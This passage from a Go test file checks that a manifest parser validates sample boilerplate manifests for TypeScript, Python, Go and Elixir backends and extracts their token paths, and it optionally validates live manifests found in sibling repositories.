					"rbac": { "adminMethod": "GET", "adminPath": "/feature-flags" },
					"websockets": { "enabled": true, "path": "/socket.io/?EIO=4&transport=websocket" }
				}
			}`,
			wantLang:  types.LangTypeScript,
			wantToken: "accessToken",
		},
		{
			name: "fastapi-backend-boilerplate",
			raw: `{
				"name": "fastapi-backend-boilerplate",
				"language": "python",
				"capabilities": {
					"health": { "method": "GET", "path": "/health/live" },
					"auth": {
						"register": { "method": "POST", "path": "/auth/register" },
						"login": { "method": "POST", "path": "/auth/login", "tokenPath": "accessToken", "refreshPath": "sessionId" },
						"me": { "method": "GET", "path": "/feature-flags" },
						"refresh": { "method": "POST", "path": "/auth/refresh" }
					},
					"rbac": { "adminMethod": "GET", "adminPath": "/feature-flags" },
					"websockets": { "enabled": true, "path": "/socket.io/?EIO=4&transport=websocket" }
				}
			}`,
			wantLang:  types.LangPython,
			wantToken: "accessToken",
		},
		{
			name: "go-backend-boilerplate",
			raw: `{
				"name": "go-backend-boilerplate",
				"language": "go",
				"capabilities": {
					"health": { "method": "GET", "path": "/health/live" },
					"auth": {
						"register": { "method": "POST", "path": "/account/register" },
						"login": { "method": "POST", "path": "/account/login", "tokenPath": "accessToken", "refreshPath": "refreshToken" },
						"me": { "method": "GET", "path": "/account/me", "userIdPath": "id" },
						"refresh": { "method": "POST", "path": "/account/refresh" }
					},
					"websockets": { "enabled": true, "path": "/realtime" }
				}
			}`,
			wantLang:  types.LangGo,
			wantToken: "accessToken",
		},
		{
			name: "phx-backend-boilerplate",
			raw: `{
				"name": "phx-backend-boilerplate",
				"language": "elixir",
				"capabilities": {
					"health": { "method": "GET", "path": "/health" },
					"auth": {
						"register": { "method": "POST", "path": "/api/auth/register" },
						"login": { "method": "POST", "path": "/api/auth/login", "tokenPath": "data.access_token" },
						"me": { "method": "GET", "path": "/api/auth/me" },
						"refresh": { "method": "POST", "path": "/api/auth/refresh" }
					},
					"websockets": { "enabled": true, "path": "/graphql/websocket" }
				}
			}`,
			wantLang:  types.LangElixir,
			wantToken: "data.access_token",
		},
	}

	for _, tc := range representativeManifests {
		t.Run(tc.name, func(t *testing.T) {
			m, err := manifest.ParseAndValidateManifest([]byte(tc.raw))
			if err != nil {
				t.Fatalf("ParseAndValidateManifest(%s) failed: %v", tc.name, err)
			}
			if m.Language != tc.wantLang || m.Capabilities.RateLimit != nil {
				t.Fatalf("unexpected manifest state for %s: %+v", tc.name, m)
			}
			if m.Capabilities.Auth == nil || m.Capabilities.Auth.Login.TokenPath != tc.wantToken {
				t.Fatalf("unexpected auth config for %s: %+v", tc.name, m.Capabilities.Auth)
			}
			samplePayload := map[string]any{
				"accessToken": "tok-top",
				"data":        map[string]any{"access_token": "tok-nested"},
			}
			if tok, ok := manifest.ExtractByPath(samplePayload, m.Capabilities.Auth.Login.TokenPath); !ok || tok == "" {
				t.Fatalf("ExtractByPath(%s) failed: ok=%v val=%v", m.Capabilities.Auth.Login.TokenPath, ok, tok)
			}
		})
	}

	// If sibling boilerplate repositories are checked out alongside this workspace, validate their live manifests too.
	siblingDirs := []string{
		"nestjs_backend_boilerplate",
		"fastapi_backend_boilerplate",
		"go_backend_boilerplate",
		"phx_backend_boilerplate",
	}
	wd, err := os.Getwd()
	if err != nil {
		return
	}
	for _, sib := range siblingDirs {
		for _, relBase := range []string{"../..", "../../..", "../../../.."} {
			candidate := filepath.Join(wd, relBase, sib, "boilerplate.manifest.json")
			if _, statErr := os.Stat(candidate); statErr == nil {
				loaded, loadErr := manifest.LoadManifest(candidate)
				if loadErr != nil {
					t.Fatalf("live sibling manifest %s failed validation: %v", candidate, loadErr)
				}
				if loaded.Name == "" || loaded.Capabilities.Health.Path == "" {
					t.Fatalf("live sibling manifest %s missing required fields: %+v", candidate, loaded)
				}
				break
			}
		}
	}
}
